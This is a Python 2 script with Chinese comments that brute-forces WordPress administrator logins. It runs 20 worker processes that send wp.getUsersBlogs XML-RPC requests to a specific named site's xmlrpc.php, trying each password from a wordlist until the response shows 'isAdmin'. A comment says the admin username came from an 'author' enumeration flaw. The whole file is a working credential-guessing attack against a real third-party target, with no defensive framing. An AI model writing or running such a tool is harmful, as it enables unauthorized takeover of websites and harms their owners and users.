# -*- coding: utf-8 -*-
import time
from multiprocessing import Process, Queue
import datetime
import urllib2

a = datetime.datetime.now()
Flag = 0


# 生产者
def production(q):
    f_password = open("passwords.txt", "r")
    i = 0
    for key in f_password:
        i = i + 1
        q.put(key)
        print "队列第" + str(i) + "个数："


# 消费者
def consumption(q, uid):
    global Flag
    requrl = "http://www.gmcdz.cn/xmlrpc.php"
    # usernames.txt 文件中其实只有一个用户名，因为我们通过author漏洞获取到了管理的用户名。
    f_username = open("usernames.txt", "r")
    for name in f_username:
        for i in range(q.qsize()):
            if Flag == 1:
                break
            # 消费一个队列
            key = q.get()
            reqdata = '<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>wp.getUsersBlogs\
                            </methodName><params><param><value>' + name + \
                      '</value></param><param><value>' + key + \
                      '</value></param></params></methodCall>'
            req = urllib2.Request(url=requrl, data=reqdata)
            result = urllib2.urlopen(req).read()
            if result.find("isAdmin") != -1:
                print result.find("isAdmin")
                print "Got it !"
                print "username :" + name + "password :" + key
                print "返回值" + result
                Flag = 1
                break

            # elif "faultString" and "403" in result:
            #     print "key:" + key
            #     continue

            else:
                b = datetime.datetime.now()
                print "时间:" + str((b - a).seconds) + ",消费key：" + str(107592 - q.qsize()) + ",进程序号:" + str(
                    uid) + ",剩余key:" + str(q.qsize()) + ",key:" + key
                # print "时间:" + str((b - a).seconds)
                # print "进程序号:" + str(uid)
                # print "剩余key:" + str(q.qsize())
                # print "key:" + key
                # print "消费key："+str(107592-q.qsize())
    print "抱歉，在此字典中并未找到正确的密码"


if __name__ == '__main__':
    # 总队列
    tatol = []
    # 创建队列
    q1 = Queue()
    # q2 = Queue(20000)
    # q3 = Queue(20000)
    # q4 = Queue(20000)
    # q5 = Queue(20000)
    # 创建生产者，将所有密码加入队列中
    p = Process(target=production, args=(q1,))
    # 设置守护进程
    # p.daemon = True
    # 开始生产
    p.start()
    time.sleep(5)
    for uid in range(20):
        # 创建消费者
        c = Process(target=consumption, args=(q1, uid))
        # 开始消费
        c.start()
